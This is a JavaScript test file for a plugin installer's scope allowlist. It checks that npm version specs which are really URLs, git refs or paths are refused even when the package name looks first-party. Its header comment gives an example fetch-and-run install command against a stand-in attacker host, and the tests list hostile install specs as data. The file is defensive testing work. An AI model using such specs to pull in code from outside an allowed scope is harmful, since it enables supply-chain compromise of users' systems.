/**
 * PLUGIN INSTALL PROVENANCE — the scope allowlist, and the half of it that was missing.
 *
 * `ALLOWED_SCOPES` is the whole trust story for installing a node package: code may only
 * come from a scope we control publish access to. It was enforced on the package NAME.
 *
 * npm's install spec is `<name>@<spec>`, and the second half is not just a version — it may
 * be a URL, a git ref or a file path. `npm install foo@https://evil.example/x.tgz` fetches
 * and runs that tarball. So the name check alone was bypassable: the name looked allowed
 * while the code came from anywhere.
 *
 * These are the tests for both halves. They matter more now that this package is published:
 * a control has to hold against someone who can read it.
 */
import test from "node:test";
import assert from "node:assert/strict";
import { dirname, join } from "node:path";
import { fileURLToPath } from "node:url";

const HERE = dirname(fileURLToPath(import.meta.url));
const BASE = join(HERE, "..");

const { isAllowedPackage, isAllowedVersion } = await import(`${BASE}/src/plugins/install.js`);

test("only the first-party scope may be installed", () => {
  assert.equal(isAllowedPackage("@unoverse-platform/openai"), true);
  assert.equal(isAllowedPackage("@attacker/openai"), false);
  // A scope PREFIX is not the scope. This is the classic near-miss.
  assert.equal(isAllowedPackage("@unoverse-platform-evil/openai"), false);
  assert.equal(isAllowedPackage("openai"), false, "an unscoped package is not first-party");
});

test("an ordinary version or range is accepted", () => {
  for (const v of ["1.2.3", "^1.2.3", "~1.2.3", ">=1.0.0", "1.x", "*", "latest", "1.0.0-beta.1", "1.0.0 || 2.0.0"])
    assert.equal(isAllowedVersion(v), true, `${v} is a real version and must be accepted`);
});

/**
 * THE BYPASS. Every one of these keeps a first-party NAME while pointing the install
 * somewhere else, which is why the version is part of the provenance control and not a
 * cosmetic field.
 */
test("a version that is really a URL, a git ref or a path is refused", () => {
  for (const v of [
    "https://evil.example/pkg.tgz",
    "http://evil.example/pkg.tgz",
    "file:/tmp/evil",
    "file:../../evil",
    "github:attacker/repo",
    "git+ssh://git@evil.example/repo.git",
    "npm:other-package@1.0.0",
    "/tmp/evil",
    "../../evil",
  ])
    assert.equal(isAllowedVersion(v), false, `"${v}" would install code from outside the allowed scope`);
});

test("the two checks are one control: a good name with a bad version is still refused", async () => {
  const { installPlugin } = await import(`${BASE}/src/plugins/install.js`);
  await assert.rejects(
    () => installPlugin("@unoverse-platform/openai", "https://evil.example/pkg.tgz"),
    /is not a version/,
    "the name passing the scope check must not be enough on its own",
  );
});
